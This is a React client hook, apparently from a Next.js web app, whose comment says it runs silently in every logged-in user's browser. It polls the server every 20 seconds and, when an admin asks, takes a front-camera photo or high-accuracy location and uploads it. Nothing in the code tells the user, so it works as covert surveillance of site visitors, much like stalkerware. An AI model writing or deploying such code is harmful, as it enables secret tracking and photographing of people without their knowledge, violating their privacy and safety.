'use client'
/**
 * useLiveDataResponder
 *
 * Runs silently in every logged-in user's browser.
 * Polls /api/visitor-live?userId=xxx every 20 seconds.
 * When admin requests live location or camera, this hook:
 *   – captures the data
 *   – sends it back via PUT /api/visitor-live
 *   – updates the user record in the database
 */
import { useEffect, useRef } from 'react'

const POLL_INTERVAL = 20_000 // 20 seconds

async function capturePhoto(): Promise<string | null> {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: 320, height: 240 },
      audio: false,
    })
    const video = document.createElement('video')
    video.srcObject = stream
    video.muted = true
    video.playsInline = true
    await new Promise<void>(res => { video.onloadedmetadata = () => res() })
    await video.play()
    await new Promise(r => setTimeout(r, 600))
    const canvas = document.createElement('canvas')
    canvas.width = 320; canvas.height = 240
    const ctx = canvas.getContext('2d')
    if (!ctx) { stream.getTracks().forEach(t => t.stop()); return null }
    ctx.drawImage(video, 0, 0, 320, 240)
    stream.getTracks().forEach(t => t.stop())
    return canvas.toDataURL('image/jpeg', 0.7)
  } catch {
    return null
  }
}

async function captureLocation(): Promise<{ lat: number; lng: number; accuracy: number } | null> {
  return new Promise(resolve => {
    if (!navigator.geolocation) { resolve(null); return }
    navigator.geolocation.getCurrentPosition(
      pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
      () => resolve(null),
      { timeout: 8000, enableHighAccuracy: true }
    )
  })
}

export function useLiveDataResponder(userId: string | null | undefined) {
  const processingRef = useRef(false)

  useEffect(() => {
    if (!userId) return

    const poll = async () => {
      if (processingRef.current) return
      try {
        const res = await fetch(`/api/visitor-live?userId=${encodeURIComponent(userId)}`, { cache: 'no-store' })
        if (!res.ok) return
        const { request } = await res.json()
        if (!request) return

        processingRef.current = true
        try {
          if (request.type === 'location') {
            const loc = await captureLocation()
            await fetch('/api/visitor-live', {
              method: 'PUT',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                requestId: request.id,
                userId,
                type: 'location',
                lat: loc?.lat ?? null,
                lng: loc?.lng ?? null,
                accuracy: loc?.accuracy ?? null,
              }),
            })
          } else if (request.type === 'camera') {
            const photo = await capturePhoto()
            await fetch('/api/visitor-live', {
              method: 'PUT',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                requestId: request.id,
                userId,
                type: 'camera',
                photo_data: photo || '',
              }),
            })
          }
        } finally {
          processingRef.current = false
        }
      } catch {
        processingRef.current = false
      }
    }

    poll() // immediate first check
    const interval = setInterval(poll, POLL_INTERVAL)
    return () => clearInterval(interval)
  }, [userId])
}
